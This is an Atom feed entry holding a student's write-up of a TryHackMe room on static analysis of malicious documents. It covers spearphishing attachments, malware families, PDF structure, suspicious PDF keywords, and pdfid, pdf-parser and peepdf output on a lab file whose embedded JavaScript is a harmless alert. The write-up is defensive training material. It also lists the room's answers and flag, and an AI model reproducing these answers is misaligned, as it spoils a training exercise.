<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://nonohm.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://nonohm.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-11-02T20:59:47+00:00</updated><id>https://nonohm.github.io/feed.xml</id><title type="html">NonoHM</title><subtitle>Welcome to my personnal website. I am currently a 2nd year student in the &quot;BUT Réseaux et Télécommunications&quot; program. I like doing sports and music besides learning new things in IT. </subtitle><entry><title type="html">THM MalDoc: Static Analysis</title><link href="https://nonohm.github.io/blog/2024/THM-MalDoc-Static-Analysis/" rel="alternate" type="text/html" title="THM MalDoc: Static Analysis"/><published>2024-10-13T16:05:51+00:00</published><updated>2024-10-13T16:05:51+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-MalDoc-Static-Analysis</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-MalDoc-Static-Analysis/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>Nowadays, documents are among the most common ways to share information. They are used for various purposes like reports, proposals and contracts. Because of their prevalence, they are also a common vector of attacks and malicious actors use documents to deliver malware, steal sensitive information or carry out phishing attacks.</p> <p>Therefore, analyzing malicious documents is an essential part of any cyber security strategy. It can help identify potential threats by analyzing the document’s content and taking steps to mitigate them. This is particularly important today when more businesses rely on digital documents to share and store sensitive information.</p> <h3 id="expected-outcome">Expected Outcome</h3> <p>The expected outcome of this room is to determine if a document is malicious or not by looking at the following indicators:</p> <ul> <li>Presence of malicious URLs / Domains</li> <li>References to File Names / API Functions</li> <li>IP Addresses</li> <li>Malicious scripts like Powershell, JavaScript, VBScript…</li> </ul> <p>In this room, we will understand the different variants of malicious documents, their structure and how they are used in different phishing attacks. We will then explore the tools and concepts required to analyze a document.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>In this room, we will cover:</p> <ul> <li>Different documents like OneNote, docm, docx, xls…</li> <li>Analyze complex Javascript</li> <li>Importance of Malicious Document Analysis</li> <li>PDF Structure and key components like objects, keywords and filtering</li> </ul> <h2 id="task-3---initial-access---spearphishing-attachment">Task 3 - Initial Access - Spearphishing Attachment</h2> <p>Malicious documents are one of the primary ways to get initial access to a system or a network. Many <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/threat-intelligence/advanced-persistent-threat-apt/">APT</a> (Advanced Persistent Threat) groups have found utilizing spearphishing attachments as their <em>Initial Access Technique</em>.</p> <h3 id="spearphishing-attachment">Spearphishing Attachment</h3> <p><a href="https://attack.mitre.org/techniques/T1566/001/">Spearphishing attachments</a> are very common cyberattacks targeting specific individuals or organizations through carefully crafted and personalized phishing emails. The attacker aims to trick the recipient into opening a malicious attachment, typically containing an harmful payload. By doing so, he gains unauthorized access to the target’s system, allowing the stealing of sensitive information and more.</p> <p>Advanced Persistent Threats (APT) are highly organized cybercrime groups or state-sponsored entities known to use spearphishing attacks to infiltrate their targets’ systems. Here are a few examples of APT groups that have used spearphishing attachments in their attacks:</p> <ul> <li><strong>APT28 (Fancy Bear):</strong> This Russian state-sponsored group has been responsible for various high-profile cyberattacks, such as the 2016 Democratic National Committee (DNC) hack. APT28 used spearphishing emails with malicious attachments disguised as legitimate files to trick recipients into opening them. Once opened, the malware installed on the victims’ computers allowed the attackers to exfiltrate sensitive information.</li> <li><strong>APT34 (OilRig):</strong> APT34 is an Iranian cyber espionage group that has targeted various industries, primarily focusing on the Middle East. One of their tactics includes spearphishing emails with malicious Microsoft Excel attachments. When victims open the attachment, a macro initiates the download and installation of malware, which then establishes a connection with the attackers’ command and control servers.</li> <li><strong>APT29 (Cozy Bear):</strong> Another Russian state-sponsored group, APT29, has targeted governments and organizations worldwide. In a high-profile attack against the Norwegian Parliament in 2020, APT29 sent spearphishing emails with malicious attachments to parliament members. The attack resulted in unauthorized access to sensitive data.</li> <li><strong>APT10 (MenuPass Group):</strong> A Chinese cyber espionage group, APT10 has targeted organizations in various sectors, including government, aerospace, and healthcare. They have used spearphishing emails with malicious attachments that appear to be legitimate documents, such as job offers or invoices. When the attachment is opened, the malware contained within it compromises the target’s system, allowing APT10 to exfiltrate sensitive data.</li> </ul> <h3 id="associated-malware-families">Associated Malware Families</h3> <p>Some of the malware families that are spreading through malicious documents are:</p> <ul> <li><strong>Emotet:</strong> Banking trojan that is often distributed through malicious email attachments, typically in the form of Microsoft Word documents. Once installed, Emotet can steal sensitive information, such as banking credentials and email addresses, and it can also be used to download additional malware. MITRE reference available <a href="https://attack.mitre.org/software/S0367/.">here</a>.</li> <li><strong>Trickbot:</strong> Banking trojan that is often distributed through malicious email attachments and is known for its modular design, which allows attackers to add new functionality to the malware as needed. Trickbot has been used to deliver ransomware, exfiltrate data, and perform other types of malicious activity. MITRE reference available <a href="https://attack.mitre.org/software/S0383/">here</a>.</li> <li><strong>QBot:</strong> Banking trojan that is often distributed through malicious email attachments and is known for its ability to steal banking credentials and other sensitive information. QBot is also capable of downloading and executing additional malware and can be used to create backdoors on infected systems. MITRE reference available <a href="https://attack.mitre.org/software/S0385/">here</a>.</li> <li><strong>Dridex:</strong> Banking trojan that is often distributed through malicious email attachments and is known for its ability to steal banking credentials and other sensitive information. Dridex has been active since 2014 and has been one of the most prevalent banking trojans in recent years. MITRE reference available <a href="https://attack.mitre.org/software/S0384/">here</a>.</li> <li><strong>Locky:</strong> Ransomware family that is often spread through malicious email attachments, typically in the form of Microsoft Word documents. Once installed, Locky encrypts the victim’s files and demands a ransom payment in exchange for the decryption key. MITRE reference available <a href="https://attack.mitre.org/software/S0369/">here</a>.</li> <li><strong>Zeus:</strong> Banking trojan that has been active since 2007 and is often distributed through malicious email attachments. Zeus is known for its ability to steal banking credentials and other sensitive information and has been used in numerous high-profile attacks over the years. MITRE reference available <a href="https://attack.mitre.org/software/S0382/">here</a>.</li> <li><strong>Petya:</strong> Ransomware family that is often spread through malicious email attachments and has been active since 2016. Petya is known for its ability to encrypt the victim’s entire hard drive, making it much more difficult to recover from than other types of ransomware. MITRE reference available <a href="https://attack.mitre.org/software/S0367/">here</a>.</li> </ul> <h3 id="questions">Questions</h3> <p><strong>From which family does the Locky malware belong to?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Ransomware</code></em></p> <p><strong>What is the Sub-technique ID assigned to Spearphishing Attachment?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">T1566.001</code></em></p> <h2 id="task-4---documents-and-their-malicious-use">Task 4 - Documents and their malicious use</h2> <p>Attackers can abuse different type of digital documents and readers security flaws to execute code on a user’s system. That is why it is important to be cautious when opening documents from unknown sources and to keep software / security measures up to date to reduce the risk of falling victim of these attacks.</p> <h3 id="pdf">PDF</h3> <p>Portable Document Format (PDF) is a widely used document format that can be opened on different devices. PDF files can be exploited by attackers to deliver malware or launch attacks through techniques like embedding malicious JavaScript, exploiting vulnerabilities in PDF readers, including phishing links, hiding malicious attachments, or using social engineering tactics. These methods can lead to malware downloads, system compromise, or credential theft. To stay safe, users should keep PDF software updated, disable JavaScript, avoid opening suspicious PDFs, and use security tools to scan files.</p> <h3 id="docm">DOCM</h3> <p>Microsoft Word documents can be used to deliver malware by using macros, which are a series of commands that automate tasks within a document. Unlike <em>.docm</em> files, <em>.docx</em> should not contain any macros and are deleted when the file is being saved. With recent versions of Word, the <em>.docm</em> file renamed <em>.docx</em> will not open and will appear corrupted because word treat differently the file by considering their extension. In completion, <em>.doc</em> files for Word 97-2003 are not structured like <em>.docx</em> and variants, hence they can embed macros and don’t give as much protection as <em>.docx</em> files. Attackers create malicious DOCM files that prompt users to enable macros to view the content, which, once activated, can execute harmful code to steal data or install malware. To mitigate this risk, users should avoid enabling macros from untrusted documents and scan files for threats.</p> <h3 id="xlsmpptm">XLSM/PPTM…</h3> <p>Excel spreadsheets and Powerpoint can be used as the same way as Word documents using macros.</p> <h3 id="xml">XML</h3> <p>Extensible Markup Language (XML) is a markup language used to store and transport data. Attackers can use XML documents to exploit vulnerabilities in a user’s system. For example, attackers can inject malicious code into an application by uploading an XML file that contains code designed to exploit vulnerabilities in the application software.</p> <h3 id="onenote">OneNote</h3> <p>OneNote is a digital note-taking application that allows users to organize and share their notes across devices. While OneNote itself is not typically used to deliver malicious content, it can be abused to deliver phishing attacks by containing rogue links or via embeded objects. Unlike Word, Excel and Powerpoint, it is not directly possible to use VBA macros with <em>.one</em> files.</p> <h2 id="task-5---pdf-documents---structure">Task 5 - PDF Documents - Structure</h2> <p>Before starting analyzing PDF Documents, we must understand its structure and what are the components that can be found within one.</p> <p>A PDF file consists of a series of objects that are organized into a specific structure. The following is a brief overview of a PDF file structure:</p> <ul> <li><strong>PDF Header:</strong> The header is the first line in a PDF file, containing a file signature and a version number. The <em>file signature</em> is a sequence of characters that identifies the file as PDF, which is <code class="language-plaintext highlighter-rouge">%PDF-x.x</code>. The version number indicates the version of the PDF specification used to create the document.</li> </ul> <pre><code class="language-pdf">%PDF-1.7 // Example of a PDF Header
</code></pre> <ul> <li><strong>PDF Body:</strong> The body contains a series of objects that are organized in a specific structure. Each object is identified by an object number and generation number, which are used to uniquely identify the object within the document.</li> </ul> <pre><code class="language-pdf">1 0 obj
&lt;&lt; /Type /Catalog
   /Pages 2 0 R
&gt;&gt;
endobj
2 0 obj
&lt;&lt; /Type /Pages
   /Kids [3 0 R 4 0 R]
   /Count 2
&gt;&gt;
endobj
3 0 obj
&lt;&lt; /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 5 0 R
&gt;&gt;
endobj
4 0 obj
&lt;&lt; /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 6 0 R
&gt;&gt;
endobj
</code></pre> <p>Below is a detailed summary of different object types available in PDF standards:</p> <table> <thead> <tr> <th><strong>Object Type</strong></th> <th><strong>Description</strong></th> <th><strong>Example</strong></th> <th><strong>Explanation</strong></th> </tr> </thead> <tbody> <tr> <td><strong>Text Object</strong></td> <td>Represents text content with formatting and positioning.</td> <td><code class="language-plaintext highlighter-rouge">plaintext BT /F1 12 Tf 100 700 Td (Hello, World!) Tj ET</code></td> <td>- <code class="language-plaintext highlighter-rouge">BT</code>: Begin text block. <br/> - <code class="language-plaintext highlighter-rouge">/F1 12 Tf</code>: Set font to <code class="language-plaintext highlighter-rouge">/F1</code> with size <code class="language-plaintext highlighter-rouge">12</code>. <br/> - <code class="language-plaintext highlighter-rouge">Td</code>: Move to (100, 700). <br/> - <code class="language-plaintext highlighter-rouge">Tj</code>: Show text “Hello, World!”. <br/> - <code class="language-plaintext highlighter-rouge">ET</code>: End text block.</td> </tr> <tr> <td><strong>Image Object</strong></td> <td>Holds images with their attributes.</td> <td><code class="language-plaintext highlighter-rouge">plaintext &lt;&lt; /Type /XObject /Subtype /Image /Width 300 /Height 200 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length 12345 &gt;&gt; stream &lt;binary image data here&gt; endstream</code></td> <td>- <code class="language-plaintext highlighter-rouge">/Type /XObject</code>: Indicates it’s an external object. <br/> - <code class="language-plaintext highlighter-rouge">/Subtype /Image</code>: Specifies it’s an image. <br/> - <code class="language-plaintext highlighter-rouge">/Width</code> &amp; <code class="language-plaintext highlighter-rouge">/Height</code>: Set dimensions. <br/> - <code class="language-plaintext highlighter-rouge">/Filter /DCTDecode</code>: JPEG compression.</td> </tr> <tr> <td><strong>Graphic Object</strong></td> <td>Defines shapes, lines, and colors.</td> <td><code class="language-plaintext highlighter-rouge">plaintext 0.5 0.5 0.5 RG 100 600 200 100 re f</code></td> <td>- <code class="language-plaintext highlighter-rouge">0.5 0.5 0.5 RG</code>: Set fill color to grey (RGB). <br/> - <code class="language-plaintext highlighter-rouge">re</code>: Create a rectangle at (100, 600) with width 200 and height 100. <br/> - <code class="language-plaintext highlighter-rouge">f</code>: Fill the rectangle.</td> </tr> <tr> <td><strong>Form Object</strong></td> <td>Allows for interactive elements like text fields.</td> <td><code class="language-plaintext highlighter-rouge">plaintext &lt;&lt; /Type /Annot /Subtype /Widget /Rect [100 500 200 550] /FT /Tx /T (TextField1) /V (Default Text) /F 4 /MK &lt;&lt; /BC [0 0 1] /BG [1 1 1] &gt;&gt; &gt;&gt;</code></td> <td>- <code class="language-plaintext highlighter-rouge">/Type /Annot</code>: Annotation object. <br/> - <code class="language-plaintext highlighter-rouge">/Subtype /Widget</code>: Indicates an interactive element. <br/> - <code class="language-plaintext highlighter-rouge">/Rect</code>: Define the field’s rectangle area. <br/> - <code class="language-plaintext highlighter-rouge">/FT /Tx</code>: Text field type.</td> </tr> <tr> <td><strong>Content Stream</strong></td> <td>Sequence of instructions for rendering the page.</td> <td><code class="language-plaintext highlighter-rouge">plaintext 1 0 0 1 0 0 cm BT /F1 24 Tf 100 700 Td (Welcome to the PDF!) Tj ET 0 0 0 RG 50 50 200 100 re f</code></td> <td>- <code class="language-plaintext highlighter-rouge">1 0 0 1 0 0 cm</code>: Transformation matrix. <br/> - <code class="language-plaintext highlighter-rouge">BT</code> &amp; <code class="language-plaintext highlighter-rouge">ET</code>: Begin and end text block. <br/> - <code class="language-plaintext highlighter-rouge">Td</code>: Move to position. <br/> - <code class="language-plaintext highlighter-rouge">RG</code>: Set fill color to black. <br/> - <code class="language-plaintext highlighter-rouge">re</code> and <code class="language-plaintext highlighter-rouge">f</code>: Create and fill a rectangle.</td> </tr> <tr> <td><strong>Font Object</strong></td> <td>Defines font properties used for text.</td> <td><code class="language-plaintext highlighter-rouge">plaintext &lt;&lt; /Type /Font /Subtype /Type1 /BaseFont /Helvetica &gt;&gt;</code></td> <td>- <code class="language-plaintext highlighter-rouge">/Type /Font</code>: Object type is a font. <br/> - <code class="language-plaintext highlighter-rouge">/Subtype /Type1</code>: Specifies the font type. <br/> - <code class="language-plaintext highlighter-rouge">/BaseFont /Helvetica</code>: Name of the font.</td> </tr> </tbody> </table> <ul> <li><strong>PDF Cross-Reference Table:</strong> The cross-reference table is a table that provides a map of the locations of all the objects in the PDF file. It is made to quickly locate objects within the file and it is used by reader software. It allows the PDF reader to jump to the object without needing to scan the whole document, which makes viewing large PDF faster. This is not to be mistaken for <em>Outlines/Bookmarks</em>, which are made for user to navigate fluently through the PDF.</li> </ul> <p>The table consists of a <strong>starting header</strong> <code class="language-plaintext highlighter-rouge">xref</code> and the numbers <code class="language-plaintext highlighter-rouge">x y</code>, which <em>x</em> is the <strong>first object number</strong> in the PDF (usually <em>0</em>) and <em>y</em> is the <strong>amount of objects</strong> present in the file. Then, the table of objects starts and each row is composed of a 10-digit number <code class="language-plaintext highlighter-rouge">XXXXXXXXXX</code>, which is the <strong>object offset compared to the beginning of the file</strong>. Moreover, there is a 5-digit number <code class="language-plaintext highlighter-rouge">YYYYY</code>, which increments as the object is modified through an editor. Also, there is a character <code class="language-plaintext highlighter-rouge">f</code> for free object, which is unused in the file and char <code class="language-plaintext highlighter-rouge">n</code> for an in-use object. These two types exists in order to not change every reference every time an object has been modified. We must note that the first object in a pdf, <code class="language-plaintext highlighter-rouge">object 0</code> is always a free object with the reserved generation number <code class="language-plaintext highlighter-rouge">65535</code>, serving as a placeholder.</p> <table> <thead> <tr> <th><strong>Section</strong></th> <th><strong>Description</strong></th> <th><strong>Example</strong></th> </tr> </thead> <tbody> <tr> <td><strong>Starting Header</strong></td> <td>The keyword that starts the xref table.</td> <td><code class="language-plaintext highlighter-rouge">xref</code></td> </tr> <tr> <td><strong>x y (Subsection Info)</strong></td> <td>Indicates the first object number (<strong>x</strong>) and the number of objects (<strong>y</strong>) in the subsection.</td> <td><code class="language-plaintext highlighter-rouge">0 5</code> (Starts at object 0, 5 objects total)</td> </tr> <tr> <td><strong>XXXXXXXXXX (Offset)</strong></td> <td>A 10-digit number representing the <strong>byte offset</strong> of the object from the beginning of the file.</td> <td><code class="language-plaintext highlighter-rouge">0000000150</code> (Object at byte 150)</td> </tr> <tr> <td><strong>YYYYY (Generation)</strong></td> <td>A 5-digit number representing the <strong>generation number</strong> of the object.</td> <td><code class="language-plaintext highlighter-rouge">00000</code> (Original generation)</td> </tr> <tr> <td><strong>n (Normal Object)</strong></td> <td>Indicates the object is <strong>in use</strong> in the PDF file.</td> <td><code class="language-plaintext highlighter-rouge">0000000150 00000 n</code></td> </tr> <tr> <td><strong>f (Free Object)</strong></td> <td>Indicates the object is <strong>free</strong>, meaning it is deleted or unused but kept for reuse.</td> <td><code class="language-plaintext highlighter-rouge">0000000000 65535 f</code></td> </tr> <tr> <td><strong>Object 0</strong></td> <td>The first object in a PDF file, always a <strong>free object</strong> with generation number <code class="language-plaintext highlighter-rouge">65535</code>.</td> <td><code class="language-plaintext highlighter-rouge">0000000000 65535 f</code></td> </tr> </tbody> </table> <pre><code class="language-pdf">xref
0 5
0000000000 65535 f    % Object 0: Always free
0000000010 00000 n    % Object 1: In use, at byte 10
0000000150 00000 n    % Object 2: In use, at byte 150
0000000200 00001 f    % Object 3: Free, generation 1, which was in-use before and now has been deleted
0000000300 00000 n    % Object 4: In use, at byte 300
</code></pre> <ul> <li><strong>PDF Trailer:</strong> The trailer is the last section in a PDF file and provides information about the document, such as the cross-reference table location, file metadata and any encryption or security settings.</li> </ul> <table> <thead> <tr> <th><strong>Section</strong></th> <th><strong>Description</strong></th> <th><strong>Example</strong></th> </tr> </thead> <tbody> <tr> <td><strong>Starting Keyword</strong></td> <td>The keyword that begins the trailer section.</td> <td><code class="language-plaintext highlighter-rouge">trailer</code></td> </tr> <tr> <td><strong>Trailer Dictionary</strong></td> <td>A dictionary containing key-value pairs that provide essential information about the PDF file.</td> <td><code class="language-plaintext highlighter-rouge">&lt;&lt; ... &gt;&gt;</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/Size</code></strong></td> <td>Indicates the total number of objects in the cross-reference table.</td> <td><code class="language-plaintext highlighter-rouge">/Size 6</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/Root</code></strong></td> <td>Reference to the <strong>root object</strong> (catalog) of the PDF, defining the document’s structure.</td> <td><code class="language-plaintext highlighter-rouge">/Root 1 0 R</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/Info</code></strong></td> <td>Reference to the <strong>document information dictionary</strong> containing metadata (like title, author, etc.).</td> <td><code class="language-plaintext highlighter-rouge">/Info 2 0 R</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/ID</code></strong></td> <td>The <strong>file identifier</strong>, which is a unique ID for the PDF file, consisting of two parts (original and modified IDs).</td> <td><code class="language-plaintext highlighter-rouge">/ID [&lt;e382f6...&gt; &lt;e382f6...&gt;]</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">/Prev</code></strong> (Optional)</td> <td>Points to the byte offset of the <strong>previous cross-reference table</strong> for incremental updates.</td> <td><code class="language-plaintext highlighter-rouge">/Prev 1234</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">startxref</code></strong></td> <td>Indicates the <strong>byte offset</strong> where the cross-reference table begins in the PDF file.</td> <td><code class="language-plaintext highlighter-rouge">startxref 456</code></td> </tr> <tr> <td><strong><code class="language-plaintext highlighter-rouge">%%EOF</code></strong></td> <td>Marks the <strong>end of the file</strong>.</td> <td><code class="language-plaintext highlighter-rouge">%%EOF</code></td> </tr> </tbody> </table> <pre><code class="language-pdf">trailer
&lt;&lt;
  /Size 6
  /Root 1 0 R
  /Info 2 0 R
  /ID [&lt;e382f6...&gt; &lt;e382f6...&gt;]
  /Prev 1234
&gt;&gt;
startxref
456
%%EOF
</code></pre> <p>Now we have explored the different sections of the PDF file format, we will see some important keywords with a focused usage in maldocs:</p> <table> <thead> <tr> <th>PDF Keyword</th> <th>Actions</th> </tr> </thead> <tbody> <tr> <td>/JavaScript</td> <td>Specifies that JavaScript code will be executed.</td> </tr> <tr> <td>/JS</td> <td>Contains the actual JavaScript code to be executed, for example, <code class="language-plaintext highlighter-rouge">(app.alert("Hello, World!"))</code>, which displays an alert box with the message “Hello, World!”.</td> </tr> <tr> <td>/Names</td> <td>Lists file names or other references used within the PDF document.</td> </tr> <tr> <td>/OpenAction</td> <td>Defines an action that will automatically execute when the PDF is opened. Located in the document catalog (the root of the PDF), it can run JavaScript, navigate to a page, etc.</td> </tr> <tr> <td>/AA (Additional Action)</td> <td>Specifies additional actions linked to document events or interactive elements, such as running a script when a user performs a specific action.</td> </tr> <tr> <td>/EmbeddedFile</td> <td>Refers to files embedded within the PDF, like scripts or other attachments, which can be accessed or executed.</td> </tr> <tr> <td>/URI</td> <td>Contains links to external URLs, allowing the PDF to link to websites or online resources.</td> </tr> <tr> <td>/SubmitForm</td> <td>Defines an action to submit form data within the PDF, typically to a specified URL or email address.</td> </tr> <tr> <td>/Launch</td> <td>Runs embedded scripts or launches other files within the PDF, sometimes referencing external files that the PDF may download or open.</td> </tr> </tbody> </table> <p>For knowledge, a JavaScipt object is defined like below:</p> <pre><code class="language-pdf">4 0 obj
&lt;&lt;
  /Type /Action
  /S /JavaScript
  /JS (app.alert("Hello, World!"))
&gt;&gt;
endobj
</code></pre> <ul> <li><strong><code class="language-plaintext highlighter-rouge">4 0 obj</code></strong>: This is the identifier for the object. In this case, it is <strong>object 4</strong>, generation <strong>0</strong>.</li> <li><strong><code class="language-plaintext highlighter-rouge">/Type /Action</code></strong>: This tells the PDF reader that the object is an <strong>action</strong>.</li> <li><strong><code class="language-plaintext highlighter-rouge">/S /JavaScript</code></strong>: The <strong><code class="language-plaintext highlighter-rouge">/S</code></strong> key defines the <strong>subtype of the action</strong>, which in this case is <strong>JavaScript</strong> (<code class="language-plaintext highlighter-rouge">/S /JavaScript</code> means this action will execute JavaScript code).</li> <li><strong><code class="language-plaintext highlighter-rouge">/JS (app.alert("Hello, World!"))</code></strong>: This is the actual <strong>JavaScript code</strong> to be executed. Here, it shows an alert dialog box that says <strong>“Hello, World!”</strong> when triggered.</li> <li><strong><code class="language-plaintext highlighter-rouge">endobj</code></strong>: This marks the end of the object.</li> </ul> <p>In order to trigger it, here <code class="language-plaintext highlighter-rouge">/OpenAction</code> flag is used. <code class="language-plaintext highlighter-rouge">/OpenAction</code> entry is located in the document catalog (the root object of the PDF). It defines an action that is automatically triggered when the document is opened, such as running JavaScript, navigating to a specific page, or zooming to a certain view.</p> <pre><code class="language-pdf">1 0 obj
&lt;&lt;
  /Type /Catalog
  /Pages 2 0 R
  /OpenAction 4 0 R
&gt;&gt;
endobj
</code></pre> <ul> <li><strong><code class="language-plaintext highlighter-rouge">/OpenAction 4 0 R</code>:</strong> Indictates to trigger the object <strong>4</strong>, generation <strong>0</strong>. The <strong>R</strong> keyword indicates that an <em>indirect reference</em> to another object is being made.</li> </ul> <h3 id="analyzing-a-simplepdf-document">Analyzing a simple.pdf document</h3> <p>Within the provided lab, we have a PDF file called <code class="language-plaintext highlighter-rouge">simple.pdf</code>. By using <em>notepad</em>, it is able to recognize the PDF structure and components:</p> <figure> <picture> <img src="/assets/img/images/thm_maldoc_static_analysis/By53snY1yg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="notepad simple.pdf" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question">Question</h3> <p><strong>Who is the author of the simple.pdf document?</strong></p> <p>The author’s name is available in the 7th object.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Ben</code></em></p> <h2 id="task-6---analyzing-a-pdf-document">Task 6 - Analyzing a PDF Document</h2> <p>When opening <code class="language-plaintext highlighter-rouge">simple.pdf</code> using notepad, we can get at first sight:</p> <ul> <li>PDF Version</li> <li>Author name</li> <li>Objects</li> <li>Keywords like <em>JavaScript</em>, <em>Action</em>…</li> <li>Trailer</li> </ul> <p>Similar information can be obtained using the <code class="language-plaintext highlighter-rouge">strings</code> command.</p> <h3 id="tools">Tools</h3> <h4 id="pdfidpy">pdfid.py</h4> <p><code class="language-plaintext highlighter-rouge">pdfid.py</code> is a tool to summarize the objects/keywords found in a PDF. We will try it using <code class="language-plaintext highlighter-rouge">pdfid.py simple.pdf</code>:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Desktop<span class="nv">$ </span>pdfid.py simple.pdf 
PDFiD 0.2.5 simple.pdf
 PDF Header: %PDF-1.7
 obj                   18    //1
 endobj                18
 stream                 3    //2
 endstream              3
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    1    //3
 /JavaScript            1
 /AA                    0
 /OpenAction            1    //4
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors <span class="o">&gt;</span> 2^24         0
</code></pre></div></div> <ol> <li><strong>Objects:</strong> This document contains 18 objects.</li> <li><strong>Streams:</strong> This document contains 3 streams (image, code, description…) that we might examine.</li> <li><strong>JS / Javascript:</strong> This document contains 1 Javascript and 1 JS instance.</li> <li><strong>OpenAction:</strong> Indicates an action will be performed when the document will be opened.</li> </ol> <h4 id="pdf-parserpy">pdf-parser.py</h4> <p><code class="language-plaintext highlighter-rouge">pdf-parser.py</code> is very handy tool used to parse, search for objects, filter and more…</p> <p>Its usage is the following:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pdf-parser.py <span class="o">[</span>option] file|zip|url
</code></pre></div></div> <p>We can get the <code class="language-plaintext highlighter-rouge">/OpenAction</code> keyword by using the <code class="language-plaintext highlighter-rouge">--search</code> option.</p> <pre><code class="language-pdf">remnux@thm-remnux:~/Desktop$ pdf-parser.py --search OpenAction simple.pdf 
obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 3 0 R, 4 0 R, 5 0 R, 6 0 R

  &lt;&lt;
    /Type /Catalog
    /Pages 2 0 R
    /Lang (en-GB)
    /StructTreeRoot 3 0 R
    /MarkInfo
      &lt;&lt;
        /Marked true
      &gt;&gt;
    /Metadata 4 0 R
    /ViewerPreferences 5 0 R
    /OpenAction 6 0 R
  &gt;&gt;
</code></pre> <p>The output shows that <em>OpenAction</em> will trigger the object number <strong>6</strong>, which is the <em>JavaScript</em> object.</p> <pre><code class="language-pdf">remnux@thm-remnux:~/Desktop$ pdf-parser.py --object 6  simple.pdf 
obj 6 0
 Type: /Action
 Referencing: 

  &lt;&lt;
    /Type /Action
    /S /JavaScript
    /JS &lt;6170702E616C657274282254484D7B4C75636B696C795F546869735F49736E27745F4861726D66756C7D22293B0A&gt;
  &gt;&gt;
</code></pre> <p>Using the above outputs, we can deduce that the <code class="language-plaintext highlighter-rouge">&lt;617070...</code> hexadecimal-text cipher will be executed as JS code as the pdf is opened.</p> <h4 id="peepdf">peepdf</h4> <p><code class="language-plaintext highlighter-rouge">peepdf</code> is another PDF analysis tool to determine if there is any suspicious elements. We can also use the interactive option <code class="language-plaintext highlighter-rouge">peepdf -i pdf_file</code> to navigate through the objects.</p> <p>With <code class="language-plaintext highlighter-rouge">peepdf simple.pdf</code>, we already get useful information such as:</p> <ul> <li>Hashes.</li> <li>Number of objects/streams/URLS found in the document.</li> <li>References to the objects.</li> <li>List of suspicious elements like <em>JavaScript/OpenAction</em>, etc.</li> </ul> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>remnux@thm-remnux:~/Desktop<span class="nv">$ </span>peepdf simple.pdf 
Warning: PyV8 is not installed!!

File: simple.pdf
MD5: 2992490eb3c13d8006e8e17315a9190e
SHA1: 75884015d6d984a4fcde046159f4c8f9857500ee
SHA256: 83fefd2512591b8d06cda47d56650f9cbb75f2e8dbe0ab4186bf4c0483ef468a
Size: 28891 bytes
Version: 1.7
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 18
Streams: 3
URIs: 0
Comments: 0
Errors: 0

Version 0:
 Catalog: 1
 Info: 7
 Objects <span class="o">(</span>18<span class="o">)</span>: <span class="o">[</span>1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18]
 Streams <span class="o">(</span>3<span class="o">)</span>: <span class="o">[</span>4, 15, 18]
  Encoded <span class="o">(</span>2<span class="o">)</span>: <span class="o">[</span>15, 18]
 Objects with JS code <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>6]
 Suspicious elements:
  /OpenAction <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>1]
  /JS <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>6]
  /JavaScript <span class="o">(</span>1<span class="o">)</span>: <span class="o">[</span>6]
</code></pre></div></div> <p>After that, we might use the interactive function for deeper analysis:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PPDF&gt; <span class="nb">help

</span>Documented commands <span class="o">(</span><span class="nb">type help</span> &lt;topic&gt;<span class="o">)</span>:
<span class="o">========================================</span>
bytes           <span class="nb">exit         </span>js_jjdecode       open          search    
changelog       extract      js_join           quit          <span class="nb">set       
</span>create          filters      js_unescape       rawobject     show      
decode          <span class="nb">hash         </span>js_vars           rawstream     stream    
decrypt         <span class="nb">help         </span>log               references    tree      
embed           info         malformed_output  replace       vtcheck   
encode          js_analyse   metadata          reset         xor       
encode_strings  js_beautify  modify            save          xor_search
encrypt         js_code      object            save_version
errors          js_eval      offsets           sctest 
</code></pre></div></div> <p>Furthermore, using <em>object</em>, we are able to retrieve our previously found JS object. The JS code is even decoded.</p> <pre><code class="language-pdf">PPDF&gt; object 6

&lt;&lt; /Type /Action
/S /JavaScript
/JS app.alert("THM{Luckily_This_Isn't_Harmful}");
 &gt;&gt;
